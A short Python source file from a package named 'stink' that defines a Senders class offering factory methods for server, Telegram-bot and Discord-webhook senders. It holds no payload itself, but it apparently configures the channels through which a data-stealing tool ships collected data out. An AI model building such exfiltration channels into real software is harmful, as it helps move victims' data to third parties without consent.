from stink.utils.senders import Server, Telegram, Discord


class Senders:

    @staticmethod
    def server(server: str):
        return Server(server=server)

    @staticmethod
    def telegram(token: str, user_id: int):
        return Telegram(token=token, user_id=user_id)

    @staticmethod
    def discord(webhook):
        return Discord(webhook=webhook)
